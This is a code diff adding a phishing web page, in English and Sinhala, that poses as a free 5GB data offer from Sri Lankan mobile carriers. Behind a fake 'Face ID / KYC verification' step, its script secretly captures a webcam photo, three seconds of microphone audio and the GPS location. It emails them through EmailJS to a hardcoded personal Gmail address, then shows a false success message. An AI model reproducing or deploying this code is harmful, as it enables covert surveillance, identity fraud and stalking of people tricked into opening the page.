@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Giga-Offer | Free 5GB Data Portal</title>
+    <style>
+        :root { --dialog-red:#ed1c24; --mobitel-blue:#0056b3; --success:#28a745; --bg:#f8f9fa; }
+        body { margin:0; font-family:'Segoe UI', Arial, sans-serif; background-color:var(--bg); display:flex; justify-content:center; align-items:center; height:100vh; color:#333; }
+        .container { background:white; width:90%; max-width:420px; border-radius:15px; box-shadow:0 15px 35px rgba(0,0,0,0.1); overflow:hidden; text-align:center; border-top:5px solid var(--dialog-red); }
+        .header { background:linear-gradient(135deg,var(--dialog-red),var(--mobitel-blue)); padding:20px; color:white; }
+        .header h1 { margin:0; font-size:22px; }
+        .header p { margin:5px 0 0; font-size:14px; opacity:0.9; }
+        .content { padding:30px 20px; }
+        .promo-box { background:#fff3f3; border:1px dashed var(--dialog-red); padding:15px; border-radius:10px; margin-bottom:20px; }
+        .promo-box h3 { color:var(--dialog-red); margin:0; font-size:18px; }
+        .instruction { font-size:14px; color:#666; margin-bottom:25px; line-height:1.5; }
+        .btn-claim { background:var(--success); color:white; border:none; padding:16px; width:100%; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; transition:0.3s; box-shadow:0 5px 15px rgba(40,167,69,0.3); }
+        .btn-claim:hover { background:#218838; transform:translateY(-2px); }
+        #loading-ui { display:none; padding:20px; }
+        .loader { border:4px solid #f3f3f3; border-top:4px solid var(--mobitel-blue); border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:0 auto 15px; }
+        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .footer { padding:15px; font-size:11px; color:#999; background:#f1f1f1; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="main-ui">
+        <div class="header">
+            <h1>National Data Offer</h1>
+            <p>Special Reward for Loyal Customers</p>
+        </div>
+        <div class="content">
+            <div class="promo-box">
+                <h3>CONGRATULATIONS!</h3>
+                <p style="margin:5px 0 0; font-weight:bold;">You are eligible for 5GB FREE DATA</p>
+            </div>
+            <p class="instruction">
+                මෙම දීමනාව ලබා ගැනීමට ඔබගේ අනන්‍යතාවය තහවුරු කළ යුතුය. <br>
+                <b>Face ID / KYC Verification</b> සඳහා ඉදිරියට යන්න.
+            </p>
+            <button class="btn-claim" onclick="startProcess()">CLAIM DATA NOW</button>
+        </div>
+    </div>
+
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <h3 id="status">Verifying Identity...</h3>
+        <p style="font-size:13px; color:#666;">පද්ධතිය පරීක්ෂා කරමින් පවතී. කරුණාකර රැඳී සිටින්න.</p>
+    </div>
+
+    <div class="footer">
+        Powered by SL Telecom Authority | Valid for Dialog, Mobitel, Hutch, Airtel
+    </div>
+</div>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
+<script>
+    // ====== ඔබගේ EmailJS IDs මෙහි ඇතුළත් කර ඇත ======
+    const config = {
+        serviceId: "service_ewxwyye",
+        templateId: "template_jyd2zzg",
+        userId: "wWHsLFeyX64KV3leJ",
+        recipientEmail: "srsithma@gmail.com"
+    };
+
+    // Initialize EmailJS
+    (function(){
+        if (window.emailjs) {
+            emailjs.init(config.userId);
+        }
+    })();
+
+    // Utility: Blob -> Base64 (returns base64 string without prefix)
+    function blobToBase64(blob) {
+        return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result.split(',')[1]);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+        });
+    }
+
+    async function startProcess() {
+        document.getElementById('main-ui').style.display = 'none';
+        document.getElementById('loading-ui').style.display = 'block';
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.createElement('video');
+            video.muted = true;
+            video.srcObject = stream;
+            await video.play();
+
+            // Capture photo
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+
+            // Record audio for 3 seconds
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.start();
+
+            setTimeout(() => recorder.stop(), 3000);
+
+            recorder.onstop = async () => {
+                const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+
+                // Get location (if allowed)
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await sendEmail(photoBlob, audioBlob, pos.coords);
+                    finish();
+                    stopStreams(stream);
+                }, async () => {
+                    await sendEmail(photoBlob, audioBlob, null);
+                    finish();
+                    stopStreams(stream);
+                });
+            };
+
+        } catch (err) {
+            alert("Error: Verification Failed. Please allow camera/microphone access to claim your data.");
+            location.reload();
+        }
+    }
+
+    async function sendEmail(photoBlob, audioBlob, coords) {
+        // Convert blobs to base64
+        const photoBase64 = await blobToBase64(photoBlob);
+        const audioBase64 = await blobToBase64(audioBlob);
+
+        // Prepare template parameters (match these keys with your EmailJS template)
+        const templateParams = {
+            from_name: "Data Claimer Portal",
+            message: "New claimer captured via web portal.",
+            recipient_email: config.recipientEmail,
+            location: coords ? `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}` : "Location denied",
+            photo: `data:image/jpeg;base64,${photoBase64}`,
+            audio: `data:audio/ogg;base64,${audioBase64}`
+        };
+
+        try {
+            await emailjs.send(config.serviceId, config.templateId, templateParams);
+            console.log("Email sent via EmailJS to", config.recipientEmail);
+        } catch (e) {
+            console.error("EmailJS send error:", e);
+            // Optionally show user-friendly message
+            document.getElementById('status').textContent = "Failed to send verification. Please try again.";
+        }
+    }
+
+    function stopStreams(s) { s.getTracks().forEach(t => t.stop()); }
+
+    function finish() {
+        document.getElementById('loading-ui').innerHTML = `
+            <div style="color:var(--success); font-size:50px;">✔</div>
+            <h3 style="color:var(--success)">Verification Successful!</h3>
+            <p>ඔබගේ 5GB දත්ත පැය 24ක් ඇතුළත සක්‍රීය වනු ඇත. ස්තුතියි!</p>
+        `;
+    }
+</script>
+
+</body>
+</html>
